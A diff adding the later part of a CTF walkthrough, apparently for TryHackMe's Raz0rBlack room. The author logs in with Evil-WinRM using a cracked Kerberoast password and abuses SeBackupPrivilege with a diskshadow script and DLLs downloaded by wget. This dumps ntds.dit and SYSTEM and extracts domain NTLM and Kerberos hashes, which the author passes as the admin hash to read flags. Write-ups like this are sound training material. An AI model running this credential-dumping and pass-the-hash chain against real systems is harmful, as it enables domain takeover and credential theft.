@@ -756,3 +756,382 @@ Stopped: Sat Aug  6 20:06:00 2022
 └─$ hashcat -m 13100 hashes.kerberoast --show                          
 $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$99ef1b60f5d5b5a45fda5db83d438551$2cd7fcd1dd241ac634f864e985946cc284e0d3b278a6a379a9c6a7e811114317b4c704e499afcb83e16361fd31508e0f825ffdf09e6640328d553b9150dd4cd15a6e5b3a78ce85cf104c30d5c81b1101ffa115ef26a057542ed4d223d2f8b3a4e1222db953403041596f079c7982af5f865b2e3e71f296cda39f43ac21dd96e5a615a77b60e91a046c8e5bb88508efcef7d56d63a3b506d10e371ab6e9e39c8db8b6ac3fdff0f9581db789c8778dd6018039f72c129b3922445f8e160bedeca8ba91943286c0c518be2e9798689c03e9c3e4ff0e335eb33772bbf0782986608719458e57df1faa47092482920bffd162bbfc93d52ff170488c7c28fe68d67d49858c73ab3e73a0f0bc6d23a35cbc660dc55203ae345464770eceb7c6967d7d5a6b865d7db066af287d9eb9d43d62c7a052db52a0ccc20526be2731af54e758426765cb01c405faa7efd8a9513887a6c7083dd810d4bd0fa97689d8b55819a417702aa8219d0bd9402c71963c21830eb27c2668a78865406e7b1b014c05cad90ca386ed1b69fc1167ae378a4f588ee6b6576e50db4cd935aa4585a81c3ba430cf48178ec850e23a4efd116476850e45bc8f7eaab5b5dd935ffa74d8ab6511657cbf49b696e4636d911021372ed2d754cb5dde5f1e8984cb9a26c3c556e39d64b684a83731023b4a23be25ba31cf441339c80c684d7d47e939a885782bb73a2a4539a94a6b4aa8aaa1b1da7884967b167a9a3e8426f372f4e6a77e9057b3e18ede42618eb0e461650e899c3b5d4fce527f6562fbe91d10a3d84eb3acbafdac403f2a3babae8ff63cae6b8b7fddeebe987b496621de1d76b669c000f172da73051fbd553e029c9d0b194f876b03147861e16e770cf3734c837650037d2a09a705352abb945635b94eac9f6aeffc964fb2e9eed54c1dd9cedcbc7521f0a93748c6efa1bb82a45d7233a1a27bc294f20a32c8592a06066ce677fd25fda72691600eb4db9f011002237697d0ea4a175cbb5b4aed01eee438a8ad36eb06f7825d91ccb2456495c697ade6d12dd29d51631d0a87869b0789fffad8e370244be664ae00002e41a289569401bb58cfa61e3ce3d1765757aded92cc74005158891de9b83230860349d12584f5fd101ed55bdc4ca3fb708dc1c635b6a8850a5b3b1de6d2fb9c21afe21ddcfeb90b3fa4c2117c985a0c8fbf8ea848bb18de8d35de7a1b9d536d2e600cdbe1fc37226e4f0f4d298b83b7efc2e64c179c5f579e4306b03866f155f0118f748abbc078ebfade43935d258f06427ca3fb42da29c9011ce1adeec4baafff8d8132004e3b460ad59506e5433ad76afdcbc5b5c10f75aa5a03dfa975e97e633f4b57a901d25593df3261cd8548760ef9a3f020524ee6ac21e7c2540d41424232c3d1f4ff9c6c3b1aaea39949:cyanide9amine5628
 
+cyanide9amine5628
+
+What is Xyan1d3's Flag?
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/smb]
+└─$ evil-winrm -i 10.10.146.199 -u xyan1d3 -H cyanide9amine5628        
+
+Evil-WinRM shell v3.4
+
+Error: Invalid hash format
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/smb]
+└─$ evil-winrm -i 10.10.146.199 -u xyan1d3 -p cyanide9amine5628
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ..
+*Evil-WinRM* PS C:\Users\xyan1d3> ls
+
+    Directory: C:\Users\xyan1d3
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021   9:34 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml
+
+*Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
+*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
+LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
+
+What is the root Flag?
+
+check privileges:
+
+*Evil-WinRM* PS C:\Users\xyan1d3> whoami /all[...]PRIVILEGES INFORMATION
+----------------------Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+The interesting one here is
+
+SeBackupPrivilege             Back up files and directories  Enabled
+
+This specific privilege escalation is based on the act of assigning a user SeBackupPrivilege. It was designed for allowing users to create backup copies of the system. This privilege allows the user to read any file on the entirety of the files that might also include some sensitive files such as the SAM file or SYSTEM Registry file. From the attacker’s perspective, this can be exploited after gaining the initial foothold in the system and then moving up to an elevated shell by essentially reading the SAM files and possibly crack the passwords of the high privilege users on the system or network.
+
+Before using this exploit we need to Dump the Domain Credentials to a file. For this, we will use DiskShadow (a Windows signed binary).
+
+Prepare the diskshadow.txt
+
+Abuse Backup Privs (important: diskshadow.txt has a space after each line):
+
+cat diskshadow.txtset metadata C:\tmp\tmp.cabs 
+set context persistent nowriters 
+add volume c: alias someAlias 
+create 
+expose %someAlias% h:
+
+Upload this file to the machine
+
+*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp
+*Evil-WinRM* PS C:\tmp> upload diskshadow.txt
+
+Execute the diskshadow.exe from the created directory
+
+*Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txtMicrosoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  HAVEN-DC
+
+-> set metadata C:\tmp\tmp.cabs
+-> set context persistent nowriters
+-> add volume c: alias someAlias
+-> create
+Alias someAlias for shadow ID {29b531e8-3c00-49f9-925d-5e1e3937af13} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}
+
+        * Shadow copy ID = {29b531e8-3c00-49f9-925d-5e1e3937af13}               %someAlias%
+                - Shadow copy set: {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 7/16/2021 3:45:20 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                - Originating machine: HAVEN-DC.raz0rblack.thm
+                - Service machine: HAVEN-DC.raz0rblack.thm
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %someAlias% h:
+-> %someAlias% = {29b531e8-3c00-49f9-925d-5e1e3937af13}
+The shadow copy was successfully exposed as h:\.
+
+Now let's abuse the SeBackupPrivilege. For this, we need few dll files which we can download from here. After downloading we need to execute it in the following way and then download the hashes.
+
+ref:
+
+    https://coldfusionx.github.io/posts/Blackfield-HTB/
+    http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738
+
+Get dll’s to abuse Backup Privs:
+
+root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+
+root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
+
+Upload, import, abuse:
+
+*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         8/6/2022   5:13 PM                tmp
+
+*Evil-WinRM* PS C:\Users\xyan1d3> upload diskshadow.txt
+Info: Uploading diskshadow.txt to C:\Users\xyan1d3\diskshadow.txt
+
+                                                             
+Data: 168 bytes of 168 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\xyan1d3> cd C:\tmp
+*Evil-WinRM* PS C:\tmp> dir
+*Evil-WinRM* PS C:\tmp> upload diskshadow.txt
+Info: Uploading diskshadow.txt to C:\tmp\diskshadow.txt
+
+                                                             
+Data: 168 bytes of 168 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  HAVEN-DC,  8/6/2022 5:15:48 PM
+
+-> set metadata C:\tmp\tmp.cabs
+-> set context persistent nowriters
+-> add volume c: alias someAlias
+-> create
+Alias someAlias for shadow ID {065f21bb-4e37-40f2-93ff-8f5956052a39} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {750215bc-31a2-4b74-b734-b8ad1350694a} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {750215bc-31a2-4b74-b734-b8ad1350694a}
+
+ * Shadow copy ID = {065f21bb-4e37-40f2-93ff-8f5956052a39}      %someAlias%
+  - Shadow copy set: {750215bc-31a2-4b74-b734-b8ad1350694a}   %VSS_SHADOW_SET%
+  - Original count of shadow copies = 1
+  - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
+  - Creation time: 8/6/2022 5:15:49 PM
+  - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+  - Originating machine: HAVEN-DC.raz0rblack.thm
+  - Service machine: HAVEN-DC.raz0rblack.thm
+  - Not exposed
+  - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+  - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %someAlias% h:
+-> %someAlias% = {065f21bb-4e37-40f2-93ff-8f5956052a39}
+The shadow copy was successfully exposed as h:\.
+->
+*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
+Info: Uploading SeBackupPrivilegeUtils.dll to C:\tmp\SeBackupPrivilegeUtils.dll
+
+                                                             
+Data: 21844 bytes of 21844 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
+Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\tmp\SeBackupPrivilegeCmdLets.dll
+
+                                                             
+Data: 16384 bytes of 16384 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll
+*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite
+*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\tmp> download ntds.dit
+Info: Downloading ntds.dit to ./ntds.dit
+
+                                                             
+Info: Download successful!
+
+*Evil-WinRM* PS C:\tmp> download system
+Info: Downloading system to ./system
+
+                                                             
+Info: Download successful!
+
+*Evil-WinRM* PS C:\tmp> 
+
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
+raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
+raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
+raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
+raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
+Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
+Administrator:des-cbc-md5:d3b646b65bceb5c7
+HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6
+HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27
+HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d
+krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
+krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
+krbtgt:des-cbc-md5:857a46f13e91eae3
+raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
+raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
+raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975
+raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
+raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
+raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6
+raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5
+raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580
+raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8
+raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559
+raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
+raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07
+
+Finally, from here we get the administrator Hashes. We can use this to login into the system using Evil-WinRM
+
+Get admin flag
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/smb]
+└─$ evil-winrm -i 10.10.46.179 -u administrator -H 9689931bed40ca5a2ce1218210177f0c
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                             
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                               
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+    Directory: C:\Users\Administrator
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        5/21/2021   9:45 AM                3D Objects
+d-r---        5/21/2021   9:45 AM                Contacts
+d-r---        5/21/2021   9:45 AM                Desktop
+d-r---        5/21/2021   9:45 AM                Documents
+d-r---        5/21/2021   9:45 AM                Downloads
+d-r---        5/21/2021   9:45 AM                Favorites
+d-r---        5/21/2021   9:45 AM                Links
+d-r---        5/21/2021   9:45 AM                Music
+d-r---        5/21/2021   9:45 AM                Pictures
+d-r---        5/21/2021   9:45 AM                Saved Games
+d-r---        5/21/2021   9:45 AM                Searches
+d-r---        5/21/2021   9:45 AM                Videos
+-a----        2/25/2021   1:08 PM            290 cookie.json
+-a----        2/25/2021   1:12 PM           2512 root.xml
+
+*Evil-WinRM* PS C:\Users\Administrator> type root.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Administrator</S>
+      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
+  </Obj>
+</Objs>
+*Evil-WinRM* PS C:\Users\Administrator>
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/smb]
+└─$ python3                                                                                            
+Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> s = "44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a"
+>>> print(bytes.fromhex(s).decode('ASCII'))
+Damn you are a genius.
+But, I apologize for cheating you like this.
+
+Here is your Root Flag
+THM{1b4f46cc4fba46348273d18dc91da20d}
+
+Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.
+
+If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
+Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
+
+>>> 
+
+What is Tyson's Flag?
+
+As Administrator:
+
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> cd twilliams
+*Evil-WinRM* PS C:\Users\twilliams> dir
+
+    Directory: C:\Users\twilliams
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021  10:18 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
+                                                 finitely_definitely_not_a_flag.exe
+
+*Evil-WinRM* PS C:\Users\twilliams> type .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
+THM{5144f2c4107b7cab04916724e3749fb0}
+
+What is the complete top secret?
+
+Enumerate all folders and find top secret path:
+
+*Evil-WinRM* PS C:\Users\twilliams> cd "C:\Program Files\Top Secret"
+*Evil-WinRM* PS C:\Program Files\Top Secret> dir
+
+    Directory: C:\Program Files\Top Secret
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/25/2021  10:13 AM         449195 top_secret.png
+
+*Evil-WinRM* PS C:\Program Files\Top Secret> download top_secret.png
+Info: Downloading top_secret.png to ./top_secret.png
+
+                                                             
+Info: Download successful!
+```
+
+## Notes / Lessons Learned
+[[Polkit_CVE]]
+
